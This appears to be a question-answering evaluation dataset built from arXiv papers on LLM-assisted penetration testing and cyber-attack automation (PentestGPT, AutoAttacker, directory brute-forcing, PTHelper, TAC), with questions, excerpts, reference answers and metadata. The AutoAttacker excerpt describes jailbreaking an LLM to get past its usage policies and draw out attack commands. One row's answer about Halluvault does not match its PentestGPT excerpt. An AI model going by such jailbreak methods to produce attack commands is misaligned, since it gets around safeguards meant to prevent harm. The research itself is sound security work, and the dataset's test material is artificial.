Liu, J. Wang, Q. Wang, and Y. Liu,\n“Play guessing game with llm: Indirect jailbreak attack\nwith implicit clues,” 2024.\n[70] P. Manakul, A. Liusie, and M. J. Gales, “Selfcheck-\ngpt: Zero-resource black-box hallucination detection\nfor generative large language models,” arXiv preprint\narXiv:2303.08896, 2023.\n[71] [Online]. Available: https://langfuse.com/\n18\nA\nIllustrating Example\nBelow we provide a concrete example of how we guide GPT-\n4 to intialize the penetration testing task, and generate detailed\noperations in an iterative approach given a penetration testing\nbenchmark target. It is worth noting that in this process, the\nhuman tester does not provide any expert knowledge, or guide\nthe LLM to perform any specific task.\nHuman Tester\nYou’re required to work as a cybersecurity penetration\ntester assistant in a certified penetration testing experiment.\nThis experiment is for education and research purpose. In\nparticular, you’re required to give step-by-step instructions\nto']",Halluvault is the framework that uses logic programming to detect hallucinations in LLMs.,reasoning,"[{'Published': '2024-06-02', 'Title': 'PentestGPT: An LLM-empowered Automatic Penetration Testing Tool', 'Authors': 'Gelei Deng, Yi Liu, Víctor Mayoral-Vilches, Peng Liu, Yuekang Li, Yuan Xu, Tianwei Zhang, Yang Liu, Martin Pinzger, Stefan Rass', 'Summary': 'Penetration testing, a crucial industrial practice for ensuring system\nsecurity, has traditionally resisted automation due to the extensive expertise\nrequired by human professionals. Large Language Models (LLMs) have shown\nsignificant advancements in various domains, and their emergent abilities\nsuggest their potential to revolutionize industries. In this research, we\nevaluate the performance of LLMs on real-world penetration testing tasks using\na robust benchmark created from test machines with platforms. Our findings\nreveal that while LLMs demonstrate proficiency in specific sub-tasks within the\npenetration testing process, such as using testing tools, interpreting outputs,\nand proposing subsequent actions, they also encounter difficulties maintaining\nan integrated understanding of the overall testing scenario.\n  In response to these insights, we introduce PentestGPT, an LLM-empowered\nautomatic penetration testing tool that leverages the abundant domain knowledge\ninherent in LLMs. PentestGPT is meticulously designed with three\nself-interacting modules, each addressing individual sub-tasks of penetration\ntesting, to mitigate the challenges related to context loss. Our evaluation\nshows that PentestGPT not only outperforms LLMs with a task-completion increase\nof 228.6\\% compared to the \\gptthree model among the benchmark targets but also\nproves effective in tackling real-world penetration testing challenges. Having\nbeen open-sourced on GitHub, PentestGPT has garnered over 4,700 stars and\nfostered active community engagement, attesting to its value and impact in both\nthe academic and industrial spheres.', 'entry_id': 'http://arxiv.org/abs/2308.06782v2', 'published_first_time': '2023-08-13', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.SE', 'categories': ['cs.SE', 'cs.CR'], 'links': ['http://arxiv.org/abs/2308.06782v2', 'http://arxiv.org/pdf/2308.06782v2']}]",True
"How does AUTOATTACKER use LLMs for multi-stage cyber-attacks, and what are the challenges and solutions?","[' avoid potential out-of-\nthe-box attacks by the LLM for uncontrollable consequences.\nOur experiment results show that AUTOATTACKER is highly\neffective in completing the attack tasks when GPT-4 is the\nleveraged LLM, achieving the perfect success rate when\nsetting the temperature parameter to 0. The results on GPT-\n3.5, Llama2-7B-chat and Llama2-70B-chat are unsatisfactory\nas most of the attack tasks failed. We further evaluate the con-\ntributions of the components included by AUTOATTACKER,\ne.g., experience manager, and show that they can reduce the\nattack overhead and cost.\nContributions. We summarize the contributions as follows:\n• We present the first comprehensive study to evaluate\nthe potential of applying LLMs to human-like hands-on-\nkeyboard attacks.\n• We design a new system AUTOATTACKER for attack\nautomation with LLMs. We propose a modular agent\ndesign to obtain the attack commands precisely from\nLLMs, with a new reasoning and planning procedure.\n• We develop a new benchmark to evaluate the LLM-based\nattack automation, with attack tasks ranging from basic\nto advanced.\n• We evaluate the effectiveness of AUTOATTACKER, and\nour results show all attack tasks can be successfully\ncompleted when GPT-4 is leveraged.\nII. BACKGROUND AND RELATED WORK\nIn this work, we explore how to automate cyber-attacks\nwith the support from LLMs. We first review the prior works\nabout attack automation before the advent of LLMs. Then,\nwe describe the key concepts and techniques of LLMs that\nare relevant to this research. Finally, we discuss the security-\nrelated issues of LLMs.\nA. Cyber-attack Automation and Frameworks\nThe contemporary cyber-attacks often involve many stages,\nlike\nreconnaissance,\nvulnerability\ndiscovery,\nexploitation,\netc [16]. Though human attackers are still involved in most of\nthe stages, especially for the sophisticated attack campaigns,\nthere have been a body of works investigating how to au-\ntomate individual steps. The majority of efforts have been\nled by DARPA in programs like the Cyber Grand Challenge\n(CGC) [25] and the recent Artificial Intelligence Cyber Chal-\nlenge (AIxCC) [26], and the main focus is on automated bi-\nnary analysis, vulnerability discovery, exploit generation, and\nsoftware patching [27]. Numerous works have been published\nunder these directions, integrating and advancing techniques\nfrom software fuzzing [28]–[30], symbolic execution [27],\n[31], [32], etc.\nOn the other hand, we found that fewer works have been\ndone regarding other attack tasks. The relevant works are\nmainly about penetration testing (pentest), through which\nsecurity professionals leverage the existing hacking tools to\nsimulate real-world attacks against organizations and report\ntheir findings [33]. To date, most pentests are orchestrated\nmanually by human experts combining their specialized or-\nganizational knowledge and expertise along with using semi-\nautomated tools that run collections of programmatic auto-\nmated actions. More intelligent automation has been explored\nwith rule-based methods [34], [35] and deep reinforcement\nlearning [36]. However, none of these automated approaches\ncan cover a comprehensive set of attack tasks and adapt\nto various environments automatically. For the research with\ndeep reinforcement learning, high computational overhead and\nlatency are incurred to train a functional model and its perfor-\nmance highly depends on the model parameters configured by\noperators. At a higher level, a few works explored how to plan\ncyber-attacks automatically under specific requirements [37],\n[38].\nCyber-attack Frameworks.\nGiven that a plethora of at-\ntack techniques and strategies were identified, some cyber-\nattack frameworks were proposed to characterize them. The\ntwo popular frameworks are MITRE ATT&CK matrix [39]\nand Cyber kill chain [16]. The MITRE ATT&CK matrix\ncategorizes the tactics, techniques, and procedures (TTPs)\nemployed by attackers. Tactics represent the attacker’s goal\n(e.g., “Lateral Movement”), techniques represent the attacker’s\ndetailed action (e.g., Use “Alternate Authentication Material”),\nand procedures represent the specific technique implemen-\ntation (e.g., “Pass the Hash”). Cyber kill chain categorizes\nattacks at a high level with 7 phases (e.g., reconnaissance,\nweaponization, etc.). In this research, we choose to automate\nthe attack tasks under the framework of the MIT', ' creation of phishing websites [14], and author\nmalware [15]. Yet, these efforts only cover the very early\nstages of the attack lifecycle (or cyber kill chain [16]), and\nit is still unclear whether LLMs can facilitate the later attack\nstages, like lateral movement, in an enterprise setting. These\nsteps so far still require “hands-on-keyboard” attacks [17] from\nthe human attackers, e.g., running Linux shell or Metasploit\nshell [18] after the initial compromise, due to the complexity of\nthe victim environment, so we expect the real-world attackers\nhave strong motivations to automate them. As the capabilities\nof LLMs inevitably continue to improve, it is critical to study\nthese risks early in order to ensure that our defensive measures\nare one step ahead, in terms of both LLM model development\nand defensive security solutions.\nChallenges of attack automation with LLM. Concurrent to\nour work, there were a few recent works that aim to automate\nor aid human for penetration testing (pentesting) [19]–[21].\nBut they either require intensive human interactions [19],\nor focus on a single attack, e.g., privilege escalation [20],\n[21]. Moreover, they observe a non-negligible failure rate\neven when leveraging GPT-4 (e.g., 4 out of 10 HacktheBox\ncapture-the-flag challenges can be solved by [19]). Hence, we\nare motivated to investigate whether it is possible to fully\narXiv:2403.01038v1  [cs.CR]  2 Mar 2024\nautomate the “hands-on-keyboard” attacks, for various attack\ntechniques, under different environment setups, and at a high\nsuccess rate.\nWe start with a preliminary study to ask GPT-3.5 and GPT-\n4 to generate the attack commands, but the result is quite\nunsatisfactory, due to limitations manifested in the LLMs\nthemselves, including their usage policy constraints, the ver-\nbose responses, their limited capabilities in tracking context,\ndifficulty in discerning subtle differences in the execution\nenvironment, etc. Moreover, our problem introduces unique\nchallenges, including 1) complicated attack task chains: an\nadvanced attack might take many subtasks and even one failed\nsubtask breaks the whole chain; 2) high-density variability of\nthe action space: the commands in bash or Metasploit have\nmany parameters and some of them are closely connected to\nsystem information or the folder path, of which one typo could\nbreak the attack command.\nOur solution. To address the aforementioned challenges and\nmaximize the potential of LLMs in attack automation, we\nimplemented a new system called AUTOATTACKER. Our main\ninsights are two-fold. 1) Instead of building a monolithic agent\nto follow the standard prompt-response interactions to obtain\nthe attack commands, we propose a modular agent design,\nto leverage different capabilities of LLMs, e.g., planning,\nsummarizing, and code generation, at different points, even\nwhen generating a single attack command. With this design,\nwe can better harness LLMs to produce precise answers. 2)\nWe borrow the idea from Retrieval Augmented Generation\n(RAG) [22] to augment LLMs with a knowledge base of the\nprevious attack actions (called experiences) before generating\nthe next action, so the chances of successful attacks are\nincreased because their composing subtasks can be reused.\nIn light of these insights, we design 4 modules, namely\nsummarizer, planner, navigator and experience manager, to\ninteract with LLMs iteratively. We also carefully design the\nprompt templates for each module, so a LLM’s response is\nhighly controllable. To bypass the usage policies, we develop\nan LLM jailbreaking technique to elicit the attack commands.\nSummary of experiment results.\nWe found the previous\nbenchmarks about LLM-based pentesting [23], [24] either\ncover a few attacks or lack detailed attack/environment spec-\nifications. As such, we develop a new benchmark with 14\ndifferent attacks, covering most of the attack stages including\nreconnaissance, initial access, execution, persistence, privilege\nescalation, etc. Our simulation environment consists of multi-\nple virtual machines (VMs) running in a Hyper-V hypervisor,\nwith different OSes (Windows and Linux) and software (e.g.,\nDomain Controller and WinRAR). The attacker VM has\ninstalled the popular open-source framework Metasploit to ex-\namine how AUTOATTACKER utilizes the attack tools. We also\ncarefully enforce security policies to']","AUTOATTACKER uses LLMs for multi-stage cyber-attacks by implementing a modular agent design that leverages different capabilities of LLMs, such as planning, summarizing, and code generation, at different points. The system also uses a knowledge base of previous attack actions to increase the chances of successful attacks. The challenges include complicated attack task chains, high-density variability of the action space, and limitations of LLMs like verbose responses and difficulty in tracking context. The solutions involve using a modular agent design and augmenting LLMs with a knowledge base of previous attack actions.",multi_context,"[{'Published': '2024-03-02', 'Title': 'AutoAttacker: A Large Language Model Guided System to Implement Automatic Cyber-attacks', 'Authors': 'Jiacen Xu, Jack W. Stokes, Geoff McDonald, Xuesong Bai, David Marshall, Siyue Wang, Adith Swaminathan, Zhou Li', 'Summary': 'Large language models (LLMs) have demonstrated impressive results on natural\nlanguage tasks, and security researchers are beginning to employ them in both\noffensive and defensive systems. In cyber-security, there have been multiple\nresearch efforts that utilize LLMs focusing on the pre-breach stage of attacks\nlike phishing and malware generation. However, so far there lacks a\ncomprehensive study regarding whether LLM-based systems can be leveraged to\nsimulate the post-breach stage of attacks that are typically human-operated, or\n""hands-on-keyboard"" attacks, under various attack techniques and environments.\n  As LLMs inevitably advance, they may be able to automate both the pre- and\npost-breach attack stages. This shift may transform organizational attacks from\nrare, expert-led events to frequent, automated operations requiring no\nexpertise and executed at automation speed and scale. This risks fundamentally\nchanging global computer security and correspondingly causing substantial\neconomic impacts, and a goal of this work is to better understand these risks\nnow so we can better prepare for these inevitable ever-more-capable LLMs on the\nhorizon. On the immediate impact side, this research serves three purposes.\nFirst, an automated LLM-based, post-breach exploitation framework can help\nanalysts quickly test and continually improve their organization\'s network\nsecurity posture against previously unseen attacks. Second, an LLM-based\npenetration test system can extend the effectiveness of red teams with a\nlimited number of human analysts. Finally, this research can help defensive\nsystems and teams learn to detect novel attack behaviors preemptively before\ntheir use in the wild....', 'entry_id': 'http://arxiv.org/abs/2403.01038v1', 'published_first_time': '2024-03-02', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2403.01038v1', 'http://arxiv.org/pdf/2403.01038v1']}, {'Published': '2024-03-02', 'Title': 'AutoAttacker: A Large Language Model Guided System to Implement Automatic Cyber-attacks', 'Authors': 'Jiacen Xu, Jack W. Stokes, Geoff McDonald, Xuesong Bai, David Marshall, Siyue Wang, Adith Swaminathan, Zhou Li', 'Summary': 'Large language models (LLMs) have demonstrated impressive results on natural\nlanguage tasks, and security researchers are beginning to employ them in both\noffensive and defensive systems. In cyber-security, there have been multiple\nresearch efforts that utilize LLMs focusing on the pre-breach stage of attacks\nlike phishing and malware generation. However, so far there lacks a\ncomprehensive study regarding whether LLM-based systems can be leveraged to\nsimulate the post-breach stage of attacks that are typically human-operated, or\n""hands-on-keyboard"" attacks, under various attack techniques and environments.\n  As LLMs inevitably advance, they may be able to automate both the pre- and\npost-breach attack stages. This shift may transform organizational attacks from\nrare, expert-led events to frequent, automated operations requiring no\nexpertise and executed at automation speed and scale. This risks fundamentally\nchanging global computer security and correspondingly causing substantial\neconomic impacts, and a goal of this work is to better understand these risks\nnow so we can better prepare for these inevitable ever-more-capable LLMs on the\nhorizon. On the immediate impact side, this research serves three purposes.\nFirst, an automated LLM-based, post-breach exploitation framework can help\nanalysts quickly test and continually improve their organization\'s network\nsecurity posture against previously unseen attacks. Second, an LLM-based\npenetration test system can extend the effectiveness of red teams with a\nlimited number of human analysts. Finally, this research can help defensive\nsystems and teams learn to detect novel attack behaviors preemptively before\ntheir use in the wild....', 'entry_id': 'http://arxiv.org/abs/2403.01038v1', 'published_first_time': '2024-03-02', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2403.01038v1', 'http://arxiv.org/pdf/2403.01038v1']}]",True
How is generative AI being utilized to enhance directory brute-forcing attacks in cybersecurity?,"[' at training time.\nExamples of LM Patterns. The high average number of successful\nresponses obtained from the LM-based approach testifies to the\nmodel’s ability to predict valid directories that follow recurring pat-\nterns. For example, let us examine the Language model’s predictions\non two different URLs:\n(1) URL: /campus-life-events/calendar. Among the top 10 direc-\ntories predicted with this URL, we have [’05’, ’06’, ’08’, ’11’,\n’may’, jun’], which refer to days or months of a calendar.\n(2) URL: /media. Among the top directories predicted with this\nURL, we have [’press-releases’, ’news’] that are found in\nmultiple paths in the training dataset and that refer to a\nsimilar context.\n7\nRELATED WORK\nThe emergence of offensive AI in cybersecurity presents a new\nfrontier where artificial intelligence (AI) is leveraged to create so-\nphisticated and automated attacks and enhance the penetration\ntesting process [9, 12]. These attacks represent a new landscape\nthat poses significant challenges and opportunities in cybersecurity,\nespecially with the raising of LLMs and generative AI.\nThe use of generative AI to enhance directory brute-forcing at-\ntacks has yet to be explored. The closest attempt is presented by He\nConference acronym ’XX, June 03–05, 2018, Woodstock, NY\nTrovato and Tobin, et al.\net al. [7], where the authors proposed an attack to medical systems\nby adopting semantic clustering of sentences. No much information\nare reported in terms of data, methodology, and results. Similarly,\nAntonelly et al. [2] presented an innovative approach using the\nUniversal Sentence Encoder (USE) for semantic analysis. The K-\nmeans algorithm and the elbow method were used for clustering to\noptimize directory brute-forcing (dirbusting), with an improvement\nin the results of up to 50% on only eight web applications tested.\nSeveral other studies have analyzed the threat that offensive\nAI poses to organizations in other types of attacks. Bontrager et\nal. [5] demonstrated the potential of AI-generated fingerprint deep-\nfakes to compromise biometric systems through dictionary attacks,\nhighlighting the vulnerability of such systems to sophisticated AI\ntechniques. Al-Hababi et al. [1] investigated man-in-the-middle at-\ntacks leveraging machine learning to identify services in encrypted\nnetwork flows. Li et al. [11] presented a generative adversarial net-\nwork designed to evade PDF malware classifiers, illustrating the\nease with which AI can bypass traditional cybersecurity defences.\nNam et al. [13] developed a recurrent GANs-based password cracker\naimed at enhancing IoT password security. While intended for de-\nfensive purposes, the study also signifies how AI can be repurposed\nfor offensive operations.\n8\nCONCLUSIONS\nCurrent directory brute-forcing attacks are notoriously inefficient\nsince they rely on brute-forcing strategies, resulting in an enor-\nmous amount of queries for a few successful discoveries. In this\nwork, we investigated whether the utilization of prior knowledge\nmight result in more efficient attacks. We propose two distinct\nmethods that rely on prior knowledge: a probabilistic model and\na Language Model-based attack. We then experimented with our\nproposed methodology in a dataset containing more than 1 million\nURLs, spanning across distinct web app domains such as universi-\nties, hospitals, companies, and government. Our results show the\nsuperiority of the proposed method, with the LM-based approach\noutperforming brute-force-based approaches in all scenarios (an\naverage performance increase of 969%). Furthermore, the simple\nprobabilistic approach results effective when the budget of requests\nis limited (below 100, for stealthier attacks).\nThe research presented in this paper lays the groundwork for\nseveral promising directions for future investigation. The use of\nArtificial Intelligence to create sophisticated attacks is a topic that is\nconstantly evolving and growing in cybersecurity, especially with\nthe fast development of Language models.\nAdvanced Language Models. Future work could explore improve-\nments of our LM-based architecture, such as attention mecha-\nnisms [18], or even Large Language Models [6]. These models’\nenhanced understanding of context and semantics could signifi-\ncantly refine the process of predicting web application structures.\nCross-Lingual Contextualization. Given that directory predic-\ntions can be constrained by the language in which a web appli-\ncation is developed']","Generative AI is being utilized to enhance directory brute-forcing attacks by leveraging prior knowledge to create more efficient attacks. Specifically, a Language Model-based approach has been proposed, which outperforms traditional brute-force-based approaches by predicting valid directories that follow recurring patterns. This method has shown an average performance increase of 969% over brute-force methods.",simple,"[{'Published': '2024-04-22', 'Title': 'Offensive AI: Enhancing Directory Brute-forcing Attack with the Use of Language Models', 'Authors': 'Alberto Castagnaro, Mauro Conti, Luca Pajola', 'Summary': 'Web Vulnerability Assessment and Penetration Testing (Web VAPT) is a\ncomprehensive cybersecurity process that uncovers a range of vulnerabilities\nwhich, if exploited, could compromise the integrity of web applications. In a\nVAPT, it is common to perform a \\textit{Directory brute-forcing Attack}, aiming\nat the identification of accessible directories of a target website. Current\ncommercial solutions are inefficient as they are based on brute-forcing\nstrategies that use wordlists, resulting in enormous quantities of trials for a\nsmall amount of success. Offensive AI is a recent paradigm that integrates\nAI-based technologies in cyber attacks. In this work, we explore whether AI can\nenhance the directory enumeration process and propose a novel Language\nModel-based framework. Our experiments -- conducted in a testbed consisting of\n1 million URLs from different web application domains (universities, hospitals,\ngovernment, companies) -- demonstrate the superiority of the LM-based attack,\nwith an average performance increase of 969%.', 'entry_id': 'http://arxiv.org/abs/2404.14138v1', 'published_first_time': '2024-04-22', 'comment': 'Under submission', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://arxiv.org/abs/2404.14138v1', 'http://arxiv.org/pdf/2404.14138v1']}]",True
How was PThelper functionality validated in a simulated pentesting environment?,"[' only chatgpt NLPAgent is available.\n• Type of Reporter that will be used. At this time, only docxtpl (Docx Jinja3 framework) Reporter is available.\n• Project to store the results. Exploits found by the Exploiter module, the generated report and other results will\nbe placed in the specified project folder.\n4.2\nTesting PThelper functionality\nTwo simulated pentesting environments were deployed to validate the behaviour of the tool.\n4.2.1\nBlack box infrastructure\nThis is a local networking scenario that includes several Virtual Machines simulating a real pentesting environment.\nThree vulnerable Virtual Machines based on Metasploitable2 [24] and Metasploitable3 [25] were used. These machines\ncontain a wide list of vulnerabilities and are intentionally designed to be vulnerable to help the pentesters develop their\nskills.\nFigure 8 shows the topology of this environment. The pentester only has network visibility of the first host, a Windows\nMetasploitable3 machine (Host A). The other two hosts in the environment are Linux hosts, corresponding to a Linux\nMetasploitable2 (Host B) and a Linux Metasploitable3 (Host C) machine. The idea is to verify if PThelper can be used\nin a black-box environment, this is, using PTHelper to compromise a host, and use the tool with the compromised host\nas pivot with hosts that were not previously accessible. This is a real and typical pentesting scenario.\nPThelper was able to detect a RCE (Remote Code Execution) vulnerability on the first host, apart from a wide list of\nother vulnerabilities. After exploiting the RCE vulnerability (CVE-2014-3120) to compromise Host A, a port forwarding\ntechnique was used to forward all traffic from PTHelper to the hosts that are not in direct network range (Host B and\nHost C) to use the tool against these hosts. PTHelper managed to detect a wide list of vulnerabilities in these two hosts\nand offered a list of exploits, some of which were used to gain DoS (denial of service) and RCE to fully compromise\n10\narXiv Template\nA PREPRINT\nthe infrastructure. The output report generated with the tool after performing this experiment by using the tool against\nthe three hosts is also available2.\nNote that not all the vulnerabilities of these hosts were found in the process, as some of them are web vulnerabilities,\nthat need to be enumerated and exploited using manual means or a specialized web scanner. This was taken into account\nand it will be one of the main improvement points of the tool.\nTable 1 details the execution times in seconds of each of the modules of the tool, in order to detect which parts of the\ntool need more development and optimization for the next versions. The benchmark was executed in a Kali 2023.2\nVirtual Machine, with 4GB of RAM memory and 4 CPU cores, and, therefore, the tool could perform better in an\nenvironment with more resources.\nTable 1: Execution time of PTHelper for each of the hosts (seconds)\nTask\nHost A\nHost B\nHost C\nScanner-Port Discovery\n1.16\n3.10\n3.13\nScanner-Vulnerability Discovery\n147.15\n350.28\n284.39\nScanner - OS Discovery\n0.01\n0.34\n0.2\nExploiter\n56.04\n128.04\n89.04\nNLPAgent - Executive Summary\n158.84\n289.82\n233.34\nNLPAgent - Finding report\n1454.66\n2493.24\n2097.75\nReporter - Render report\n0.1362\n0.1418\n0.1591\nTotal time\n1720.98\n3365.83\n2708.75\nOverall, the most time-consuming part of the Scanner module is the Vulnerability Discovery part where queries to the\nNVD API are performed. For each of these queries, there is a delay when performing and receiving these requests,\nalthough the delay parameter was adjusted to the minimum possible allowed by the API. Due to the amount of\nvulnerabilities per host, this part was time consuming, reaching more than five (5) minutes for the Host B.\nThe Exploiter module had an execution time between one (1) and two (2) minutes. For the NLPAgent module, times are\nsignificantly higher compared to the rest of the modules. Most of the execution time of the tool resides in this module,\nand, specially, in the Finding Report section of the tool. The justification is simple: The tool performs one query to the\nOpenAI API per obtained finding. Taking into account that']","PThelper functionality was validated in a simulated pentesting environment by deploying two simulated pentesting environments. One of these environments was a black box infrastructure that included several Virtual Machines simulating a real pentesting environment. Three vulnerable Virtual Machines based on Metasploitable2 and Metasploitable3 were used. PThelper was able to detect a Remote Code Execution (RCE) vulnerability on the first host and used a port forwarding technique to forward all traffic to the hosts that were not in direct network range. PThelper managed to detect a wide list of vulnerabilities in these hosts and offered a list of exploits, some of which were used to gain DoS and RCE to fully compromise the infrastructure.",simple,"[{'Published': '2024-06-12', 'Title': 'PTHelper: An open source tool to support the Penetration Testing process', 'Authors': 'Jacobo Casado de Gracia, Alfonso Sánchez-Macián', 'Summary': 'Offensive security is one of the state of the art measures to protect\nenterprises and organizations. Penetration testing, broadly called pentesting,\nis a branch of offensive security designed to find, rate and exploit these\nvulnerabilities, in order to assess the security posture of an organization.\nThis process is often time-consuming and the quantity of information that\npentesters need to manage might also be difficult to handle. This project takes\na practical approach to solve the automation of pentesting and proposes a\nusable tool, called PTHelper. This open-source tool has been designed in a\nmodular way to be easily upgradable by the pentesting community, and uses state\nof the art tools and artificial intelligence to achieve its objective.', 'entry_id': 'http://arxiv.org/abs/2406.08242v1', 'published_first_time': '2024-06-12', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://arxiv.org/abs/2406.08242v1', 'http://arxiv.org/pdf/2406.08242v1']}]",True
How does TAC's RL-based query optimization enhance greybox IAM testing over whitebox?,"[' detection, TAC represents IAM configurations as\n20\nYang Hu, Wenxi Wang, Sarfraz Khurshid, and Mohit Tiwari\nabstract PFGs for greybox penetration testing. Unfortunately, by the time of the paper submission,\nthis reasoning-based detector has not been made publicly available.\nThe modeling used in IAM PE detection can also be adapted for IAM PE repair. IAM-Deescalate[14]\nis the first approach for IAM PE repair, utilizing IAM modeling from PMapper[21]. Recently,\nIAMPERE [23], built on the IAM modeling of TAC, has shown significant improvements over\nIAM-Deescalate in both effectiveness and efficiency, highlighting the superiority of TAC’s IAM\nmodeling.\nFormal Methods for IAM. Besides IAM PE detection tools, there are IAM security tools using\nformal methods to address broader security issues. The AWS team has developed several formal ver-\nification tools for IAM, including ZELKOVA [10], Block Public Access [11], and Amazon Verified\nPermission [9]. These tools utilize SMT solvers to verify non-PE security and availability properties\nof IAM configurations, such as determining whether a user can access a resource. Eiers et al.[18, 19]\nintroduced a quantitative IAM policy analysis framework based on model counting to identify and\nmitigate security risks associated with overly permissive IAM policies. Unlike these tools that rely\non automated logical reasoning techniques, TAC models IAM configurations as permission flow\ngraphs, enabling PE detection through a lightweight fixed-point iteration process without complex\nreasoning.\nRL for Greybox Penetration Testing. RL has been extensively utilized to enhance greybox\npenetration testing. Existing tools [48–51, 54, 58] use the Partially Observable Markov Decision\nProcess (POMDP) [38] to select attack operations based on partial network/system configurations.\nOur abstract IAM modeling enables TAC to frame the query decision problem as a classic Markov\nDecision Process, which can be optimized effectively and efficiently using advanced RL approaches.\nIn contrast, optimizing POMDPs faces severe computational and statistical challenges [32, 35, 59],\npotentially affecting the performance of these testing techniques.\n9\nDISCUSSION\nApplicability. Customers have a variety of options to simplify their query response procedures.\nThey can utilize tools or services of the cloud provider to improve the efficiency of reviewing or\nassessing configurations. For instance, the official IAM Policy Simulator [7] is an excellent tool\nfor shaping query responses. More specifically, to address a query about a permission assignment,\ncustomers can leverage the tool to simulate the entity applying the permission, avoiding the hassle\nof manual configuration analysis. Moreover, in the future, we plan to develop a light-weight open-\nsource tool to provide a user-friendly GUI in aiding customers with their query response. This not\nonly improves TAC’s applicability, but also allows customers to examine the source code of the tool\nto enhance the trustworthiness.\nAlthough TAC is initially designed for AWS, it can be adapted to detect privilege escalations\nin other cloud platforms such as Google Cloud. This can be simply achieved by adding new\npermission flow templates based on other cloud’s official documentation. Moreover, the GNN\nand RL approach that TAC leverages to interact with humans in a semi-automated fashion can\nfind broader applicability in security research, such as fuzzing, vulnerability repair, and privacy-\ncentric machine learning, etc. For example, GNN-based RL can be employed in fuzzing to enhance\nseed scheduling and mutation operator selection, thereby boosting fuzzer’s capability of finding\nbugs. Furthermore, the interactive concept can be applied in efficient human-assisted fuzzing for\nenhancing the overall code coverage: GNN-based RL can be applied to intelligently identify critical\nand challenging constraints, and deliver to human experts who can then use their domain-specific\nknowledge to design high-quality test cases for these constraints.\nLimitations. We identify three limitations of our approach. First, TAC requires customers to respond\nto queries manually. We have mitigated this by refining our query model with RL, reducing the\nInteractive Greybox Penetration Testing for Cloud Access Control using IAM Modeling and Deep Reinforcement Learning\n21\nnumber of queries. Further, auxiliary tools can facilitate semi/fully automated responses. Second,\nwithout PEs present, TAC consumes its entire query budget before confirming their absence. An\nearly-stopping mechanism, halting queries when PEs seem unlikely to appear, can address this.\nThird, the scarcity of real-world IAM misconfigurations makes it hard to assess how accurately\nIAMV', 'box variants of TAC,\neach of which employs a different pretraining strategy or query model.\nAs a result, on the synthesized IAM PE task set by IAMVulGen, TAC’s whitebox variant successfully\ndetected all PEs, and significantly outperforms all three state-of-the-art whitebox baselines, showing\nthe outstanding effectiveness of our IAM modeling. In addition, given a query budget of 100,\nTAC identifies 6% to 38% more PEs with 16% to 23% fewer queries on average than all its three\ngreybox variants, demonstrating the superiority of our pretraining based deep RL approach. On\nthe only publicly available task set IAM Vulnerable [1], TAC is able to detect 23 PEs under a query\nbudget of 10, and all 31 PEs with a query budget of 20, which substantially outperforms all three\nwhitebox baselines. Furthermore, TAC successfully detects two real-world PEs with a query budget\nof 60. The contributions of this paper are:\n• Modeling. A comprehensive modeling for IAM configurations is introduced, providing the\nfoundation of IAM PE detection.\n• Approach. TAC is the first interactive greybox penetration testing tool for third-party cloud\nsecurity services to detect PEs due to IAM misconfigurations.\n• Synthetic Data. An IAM PE task generator called IAMVulGen is proposed.\n2\nBACKGROUND\n2.1\nRL Basics\nRL refers to a set of algorithms that aim to learn to make decisions from interactions [57]. An RL\nproblem is usually formulated as a Markov Decision Process (MDP). In MDP, the learner or the\ndecision maker is called the RL agent. The RL agent interacts with the environment which maintains\nits internal state. In each interaction between the RL agent and the environment, the RL agent\nchooses an action to perform; the environment then updates its state based on the action, and\nreturns a reward quantifying the effectiveness of the action.\nIn this paper, we only consider a finite sequence of interactions between the RL agent and the\nenvironment, which are divided into several sub-sequences, namely episodes. Each episode starts\nfrom an initial state and ends with a terminal state. If an episode ends, the state of the environment\nwill be automatically reset to the initial state for the next episode to start. The return refers to the\ncumulative rewards for one episode. The goal of the RL agent is to learn an RL policy for choosing\nan action per interaction that maximizes the expected return.\n2.2\nIAM Basics\n2.2.1\nIAM Configurations. IAM configuration consists of two components: entities and permissions.\nAn entity represents either a subject or a role in an IAM configuration. Subjects (i.e., users, user\ngroups and services) can actively perform actions. Roles are created to represent job functions and\nresponsibilities within an organization. Permissions refer to privileges of performing operations. An\nentity in an IAM configuration can obtain permissions in both direct and indirect ways. Permissions\ncan be directly assigned to users, user groups and roles; permissions assigned to an entity can be\nindirectly assigned to another entity in many ways, depending on the relationship between the\ntwo entities. For example, all permissions assigned to a user group can be indirectly assigned to a\nuser in the user group; all permissions assigned to a role can be indirectly assigned to a user who\nassumes the role (i.e., become a member of the role).\n4\nYang Hu, Wenxi Wang, Sarfraz Khurshid, and Mohit Tiwari\nUser 1\nUser 2\nPerm 1\nPerm 2\nPerm 3\nPermissions\nService 1\nRole 1\nRole 2\nGroup 1\nEntities\n(a) Original configuration.\nUser 1\nUser 2\nPerm 1\nPerm 2\nPerm 3\nPermissions\nService 1\nRole 1\nRole 2\nGroup 1\nEntities\n(b) Modified configuration.\nFig. 1. An illustrative example of a PE due to IAM misconfiguration, derived from a notable real-world incident\nin 2019. Figure (a) shows the original IAM configuration, where the entity-entity and entity-permission\nconnections are highlighted in blue and orange, respectively. Figure (b) shows the modified IAM configuration\nin the PE, where the modification is highlighted in red.\nFigure 1a presents an IAM configuration example as a relational graph. In the example, there\nare six entities with four entity types: one user group Group 1, two users User 1 and User 2, one\nservice Service 1, and two roles Role 1 and Role 2. Besides, there are three permissions: Perm\n1, Per']","TAC's RL-based query optimization enhances greybox IAM testing over whitebox by significantly outperforming all three state-of-the-art whitebox baselines in detecting PEs. Given a query budget of 100, TAC identifies 6% to 38% more PEs with 16% to 23% fewer queries on average than all its three greybox variants, demonstrating the superiority of its pretraining based deep RL approach.",multi_context,"[{'Published': '2024-06-08', 'Title': 'Interactive Greybox Penetration Testing for Cloud Access Control using IAM Modeling and Deep Reinforcement Learning', 'Authors': 'Yang Hu, Wenxi Wang, Sarfraz Khurshid, Mohit Tiwari', 'Summary': 'Identity and Access Management (IAM) is an access control service in cloud\nplatforms. To securely manage cloud resources, customers need to configure IAM\nto specify the access control rules for their cloud organizations. However,\nincorrectly configured IAM can be exploited to cause a security attack such 